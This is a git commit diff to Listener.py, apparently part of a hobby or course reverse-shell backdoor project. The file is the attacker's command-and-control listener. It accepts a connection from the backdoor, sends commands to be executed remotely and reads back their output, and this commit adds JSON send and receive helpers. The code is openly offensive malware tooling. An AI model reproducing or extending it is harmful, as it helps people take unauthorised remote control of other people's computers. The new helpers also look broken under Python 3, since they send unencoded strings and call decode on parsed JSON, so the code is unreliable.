914c34a64970f8b8edcbdf6cf6e849fa1d71ec52
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-26 23:35:45 +0530

    Implemented Reliable Send and Recieve using JSON

--- Listener.py
+++ Listener.py
@@ -1,20 +1,26 @@
-import socket
+import socket, json
 
 class Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        # listener.bind(('10.38.1.110', 4444))
         listener.bind((ip, port))
         listener.listen(0)
         print('[+] Waiting for incoming connections.')
         self.connection, address = listener.accept()
         print('[+] Got a connection from ' + str(address))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
 
+    def reliable_recieve(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+    
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024).decode()
+        self.reliable_send(command)
+        return self.reliable_recieve().decode()
     
     def run(self):
         while True:
